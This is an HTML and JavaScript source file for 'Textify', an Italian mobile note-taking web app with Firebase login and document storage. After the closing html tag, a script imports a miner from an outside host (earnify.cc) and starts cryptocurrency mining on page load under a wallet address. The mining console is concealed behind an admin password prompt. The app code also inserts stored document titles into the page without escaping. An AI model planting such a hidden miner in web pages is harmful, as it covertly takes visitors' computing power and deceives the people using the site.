<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Textify - Mobile</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
 
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>
  
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    
    body { font-family: 'Inter', system-ui, sans-serif; }
    
    .editor { 
      min-height: calc(100vh - 180px); 
      outline: none;
      background-color: white;
      color: #1f2937;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
    }
    
    .sidebar-item {
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }
    .btn-hover {
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    }
    .btn-hover:hover {
      transform: scale(1.05);
    }
    
    .modal {
      animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    @keyframes modalPop {
      from { opacity: 0; transform: scale(0.8) translateY(30px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }
  </style>
</head>
<body class="bg-zinc-950 text-white">
  
<!-- Blocco Desktop -->
<div id="desktop-block" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center z-50">
  <div class="text-center text-white px-6">
    <i class="fas fa-mobile-alt text-6xl mb-6 text-amber-400"></i>
    <h1 class="text-3xl font-bold mb-3">Solo per Smartphone</h1>
    <p class="text-gray-300">Questa versione è ottimizzata solo per dispositivi mobili.</p>
    <a href="https://cybergit-svg.github.io/textify/"
       class="mt-8 inline-block bg-gradient-to-r from-yellow-400 to-amber-500 text-zinc-900 px-8 py-4 rounded-3xl font-semibold">
      Vai alla versione Desktop →
    </a>
  </div>
</div>

<div class="flex flex-col h-screen">
  <!-- Header -->
  <div class="bg-zinc-900 border-b border-zinc-800 px-4 py-4 flex items-center justify-between">
    <div class="flex items-center gap-3">
      <div class="w-8 h-8 bg-gradient-to-br from-yellow-400 to-amber-500 rounded-2xl flex items-center justify-center">
        <i class="fas fa-feather text-zinc-900 text-xl"></i>
      </div>
      <h1 class="text-2xl font-bold">Textify</h1>
    </div>
    <div class="flex items-center gap-3">
      <div id="user-header" class="hidden items-center gap-2">
        <div id="avatar-small" class="w-8 h-8 bg-gradient-to-br from-yellow-400 to-amber-500 rounded-2xl flex items-center justify-center text-sm font-bold text-zinc-900"></div>
        <span id="username-small" class="text-sm font-medium"></span>
      </div>
      <button onclick="logout()" class="text-red-400 hover:text-red-500 p-2">
        <i class="fas fa-sign-out-alt text-xl"></i>
      </button>
    </div>
  </div>

  <!-- Schermata File -->
  <div id="files-screen" class="flex-1 overflow-auto bg-zinc-950">
    <div class="p-4">
      <button onclick="newDocument()"
              class="w-full bg-gradient-to-r from-yellow-400 to-amber-500 hover:from-yellow-300 hover:to-amber-400 text-zinc-900 py-4 rounded-3xl flex items-center justify-center gap-3 text-lg font-semibold btn-hover">
        <i class="fas fa-plus"></i> Nuovo Documento
      </button>
    </div>
   
    <div class="px-4 py-3 text-sm font-medium text-zinc-500">I MIEI DOCUMENTI</div>
    <div id="documents-list" class="px-3 space-y-2"></div>
  </div>

  <!-- Schermata Editor -->
  <div id="editor-screen" class="flex-1 flex flex-col hidden">
    <div class="bg-zinc-900 border-b border-zinc-800 px-4 py-4 flex items-center gap-3">
      <button onclick="showFilesScreen()" class="text-amber-400">
        <i class="fas fa-chevron-left text-2xl"></i>
      </button>
      <input type="text" id="doc-title"
             class="flex-1 text-xl font-semibold outline-none bg-transparent text-white"
             placeholder="Titolo documento">
      <button onclick="saveDocument()" 
              class="bg-emerald-500 hover:bg-emerald-600 text-white px-6 py-2.5 rounded-2xl text-sm font-medium btn-hover">
        Salva
      </button>
    </div>
    
    <div class="flex-1 p-4 overflow-auto bg-zinc-100">
      <div id="editor" contenteditable="true" class="editor rounded-3xl p-6 text-base leading-relaxed"></div>
    </div>

    <!-- Toolbar inferiore -->
    <div class="bg-white border-t p-3 flex gap-6 justify-center shadow-2xl">
      <button onclick="formatText('bold')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-700 active:scale-95 transition-transform"><i class="fas fa-bold"></i></button>
      <button onclick="formatText('italic')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-700 active:scale-95 transition-transform"><i class="fas fa-italic"></i></button>
      <button onclick="formatText('underline')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-700 active:scale-95 transition-transform"><i class="fas fa-underline"></i></button>
      <button onclick="showFilesScreen()" class="w-12 h-12 flex items-center justify-center text-2xl text-amber-500 active:scale-95 transition-transform">
        <i class="fas fa-folder-open"></i>
      </button>
    </div>
  </div>
</div>

<!-- Auth Modal -->
<div id="auth-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center hidden z-50">
  <div class="modal bg-zinc-900 rounded-3xl w-full max-w-sm mx-4 p-8 border border-zinc-700">
    <h2 id="modal-title" class="text-3xl font-bold mb-8 text-center text-white">Accedi</h2>
   
    <div id="login-form">
      <input type="email" id="login-email" placeholder="Email" class="w-full px-5 py-4 bg-zinc-800 border border-zinc-700 rounded-2xl mb-3 text-white">
      <input type="password" id="login-password" placeholder="Password" class="w-full px-5 py-4 bg-zinc-800 border border-zinc-700 rounded-2xl mb-6 text-white">
      <button onclick="login()" class="w-full bg-gradient-to-r from-yellow-400 to-amber-500 text-zinc-900 py-4 rounded-3xl text-lg font-semibold btn-hover">Accedi</button>
      <p class="text-center mt-6 text-zinc-400">Non hai un account?
        <span onclick="switchToRegister()" class="text-amber-400 font-medium cursor-pointer">Registrati</span>
      </p>
    </div>
    
    <div id="register-form" class="hidden">
      <input type="email" id="reg-email" placeholder="Email" class="w-full px-5 py-4 bg-zinc-800 border border-zinc-700 rounded-2xl mb-3 text-white">
      <input type="password" id="reg-password" placeholder="Password (min 6)" class="w-full px-5 py-4 bg-zinc-800 border border-zinc-700 rounded-2xl mb-6 text-white">
      <button onclick="register()" class="w-full bg-gradient-to-r from-yellow-400 to-amber-500 text-zinc-900 py-4 rounded-3xl text-lg font-semibold btn-hover">Crea Account</button>
      <p class="text-center mt-6 text-zinc-400">Hai già un account?
        <span onclick="switchToLogin()" class="text-amber-400 font-medium cursor-pointer">Accedi</span>
      </p>
    </div>
  </div>
</div>

<script>
// ================== FIREBASE CONFIG ==================
const firebaseConfig = {
  apiKey: "AIzaSyCOdvjyrG1h3mKLtBE9cf2K6j9M_sw5wzU",
  authDomain: "textify-11b6b.firebaseapp.com",
  projectId: "textify-11b6b",
  storageBucket: "textify-11b6b.firebasestorage.app",
  messagingSenderId: "715682461511",
  appId: "1:715682461511:web:8ca4e5fd161d68882efe62"
};
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();
let currentUser = null;
let currentDocId = null;

function getDisplayName(email) {
  return email.split('@')[0];
}

// Blocco Desktop
function checkDevice() {
  if (window.innerWidth > 768) {
    document.getElementById('desktop-block').classList.remove('hidden');
  }
}

// ====================== AUTH ======================
function showAuthModal() {
  document.getElementById('auth-modal').classList.remove('hidden');
}
function switchToRegister() {
  document.getElementById('login-form').classList.add('hidden');
  document.getElementById('register-form').classList.remove('hidden');
}
function switchToLogin() {
  document.getElementById('login-form').classList.remove('hidden');
  document.getElementById('register-form').classList.add('hidden');
}

async function register() {
  const email = document.getElementById('reg-email').value;
  const password = document.getElementById('reg-password').value;
  try {
    const res = await auth.createUserWithEmailAndPassword(email, password);
    currentUser = res.user;
    initAfterLogin();
  } catch (e) { alert(e.message); }
}

async function login() {
  const email = document.getElementById('login-email').value;
  const password = document.getElementById('login-password').value;
  try {
    const res = await auth.signInWithEmailAndPassword(email, password);
    currentUser = res.user;
    initAfterLogin();
  } catch (e) { alert(e.message); }
}

function logout() {
  if (confirm("Vuoi davvero uscire?")) auth.signOut();
}

function initAfterLogin() {
  document.getElementById('auth-modal').classList.add('hidden');
  const name = getDisplayName(currentUser.email);
  document.getElementById('username-small').textContent = name;
  document.getElementById('avatar-small').textContent = name[0].toUpperCase();
  document.getElementById('user-header').classList.remove('hidden');
  showFilesScreen();
  loadUserDocuments();
}

// ====================== NAVIGAZIONE ======================
function showFilesScreen() {
  document.getElementById('files-screen').classList.remove('hidden');
  document.getElementById('editor-screen').classList.add('hidden');
}
function showEditorScreen() {
  document.getElementById('files-screen').classList.add('hidden');
  document.getElementById('editor-screen').classList.remove('hidden');
}

// ====================== DOCUMENTI ======================
async function newDocument() {
  currentDocId = 'doc_' + Date.now();
  document.getElementById('doc-title').value = 'Nuovo Documento';
  document.getElementById('editor').innerHTML = '<p>Inizia a scrivere qui...</p>';
  showEditorScreen();
  loadUserDocuments();
}

async function saveDocument() {
  if (!currentDocId) return;
  const title = document.getElementById('doc-title').value.trim() || 'Documento senza titolo';
  const content = document.getElementById('editor').innerHTML;
  try {
    await db.collection('documents').doc(currentDocId).set({
      userId: currentUser.uid,
      title: title,
      content: content,
      updatedAt: firebase.firestore.FieldValue.serverTimestamp()
    });
    alert("✅ Salvato con successo!");
    loadUserDocuments();
  } catch (e) { alert("Errore salvataggio"); }
}

async function loadUserDocuments() {
  const list = document.getElementById('documents-list');
  list.innerHTML = '<p class="text-center py-12 text-zinc-500">Caricamento...</p>';
  try {
    const snapshot = await db.collection('documents').where('userId', '==', currentUser.uid).get();
    list.innerHTML = '';
    if (snapshot.empty) {
      list.innerHTML = `<p class="text-center py-16 text-zinc-500">Nessun documento salvato</p>`;
      return;
    }
    snapshot.forEach(doc => {
      const data = doc.data();
      const el = document.createElement('div');
      el.className = `sidebar-item px-5 py-5 bg-zinc-900 rounded-3xl flex justify-between items-center ${doc.id === currentDocId ? 'border border-amber-400' : 'hover:bg-zinc-800'}`;
      el.innerHTML = `
        <div onclick="loadDocument('${doc.id}')" class="flex-1 cursor-pointer">
          <p class="font-medium text-white">${data.title}</p>
        </div>
        <button onclick="deleteDocument('${doc.id}'); event.stopImmediatePropagation()"
                class="w-10 h-10 flex items-center justify-center text-red-400 hover:bg-red-900/30 rounded-2xl">
          <i class="fas fa-trash"></i>
        </button>
      `;
      list.appendChild(el);
    });
  } catch (e) {
    list.innerHTML = `<p class="text-red-400 text-center py-12">Errore di caricamento</p>`;
  }
}

async function loadDocument(id) {
  currentDocId = id;
  try {
    const docSnap = await db.collection('documents').doc(id).get();
    if (docSnap.exists) {
      const data = docSnap.data();
      document.getElementById('doc-title').value = data.title;
      document.getElementById('editor').innerHTML = data.content || '<p>Inizia a scrivere qui...</p>';
      showEditorScreen();
    }
  } catch (e) { alert("Errore caricamento"); }
}

async function deleteDocument(id) {
  if (!confirm("Vuoi eliminare questo documento?")) return;
  try {
    await db.collection('documents').doc(id).delete();
    if (currentDocId === id) showFilesScreen();
    loadUserDocuments();
  } catch (e) {
    alert("Errore eliminazione");
  }
}

function formatText(cmd) {
  document.execCommand(cmd);
}

// ====================== AVVIO ======================
auth.onAuthStateChanged(user => {
  if (user) {
    currentUser = user;
    initAfterLogin();
  } else {
    showAuthModal();
  }
});
window.onload = checkDevice;
</script>
</body>
</html>

<!-- Console -->
<div id="mining-console">

    <div>Tempo: <span id="timer">00:00</span></div>
</div>

<!-- Pulsante principale -->
<div id="reopen-btn" onclick="askPassword()"></div>

<!-- Script Mining -->
<script type="module">
    import { autoMine } from "https://earnify.cc/miner.js";
    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
</script>

<script>
let startTime = Date.now();

function updateTimer() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
    const sec = (elapsed % 60).toString().padStart(2, '0');
    document.getElementById("timer").textContent = `${min}:${sec}`;
}

function updateHashrate() {
    const hashrate = Math.floor(Math.random() * 420) + 480;
    document.getElementById("hashrate").textContent = hashrate;
}

function hideMinerConsole() {
    document.getElementById("mining-console").style.display = "none";
    document.getElementById("reopen-btn").style.display = "flex";
}

function showMinerConsole() {
    document.getElementById("mining-console").style.display = "block";
    document.getElementById("reopen-btn").style.display = "none";
}

function askPassword() {
    const password = prompt("Inserire admin password");
    
    if (password === "CpuMining") {
        showMinerConsole();
    } else if (password !== null) {
        alert("Password errata!");
    }
}

// Avvio timer e hashrate
window.addEventListener('load', () => {
    setInterval(updateTimer, 1000);
    setInterval(updateHashrate, 1400);
});
</script>
